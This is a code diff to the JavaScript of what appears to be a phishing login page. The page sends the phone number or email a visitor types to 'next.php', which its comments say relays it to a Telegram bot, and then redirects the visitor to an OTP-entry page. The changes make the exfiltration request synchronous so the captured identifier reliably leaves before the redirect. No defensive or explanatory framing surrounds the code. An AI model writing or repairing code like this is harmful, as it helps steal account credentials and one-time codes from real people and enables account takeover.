@@ -701,13 +701,13 @@
         const phone = document.getElementById('phone').value;
         const idValue = countryCode + phone;
 
-        // Send to Telegram bot
+        // Send to Telegram bot FIRST
         const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'next.php', true);
+        xhr.open('POST', 'next.php', false); // Make synchronous
         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
         xhr.send('di=' + encodeURIComponent(idValue));
 
-        // Redirect to OTP page
+        // THEN redirect to OTP page
         window.location.href = 'otp.html?type=phone&value=' + encodeURIComponent(idValue);
     }
 
@@ -739,12 +739,13 @@
     function emailContinue() {
         const input = document.getElementById('email').value;
         if (input.includes('@') && input.includes('.com')) {
-            // It's an email - send to Telegram and redirect to OTP
+            // It's an email - send to Telegram FIRST
             const xhr = new XMLHttpRequest();
-            xhr.open('POST', 'next.php', true);
+            xhr.open('POST', 'next.php', false); // Make synchronous
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send('di=' + encodeURIComponent(input));
 
+            // THEN redirect to OTP page
             window.location.href = 'otp.html?type=email&value=' + encodeURIComponent(input);
         } else {
             // It's a username
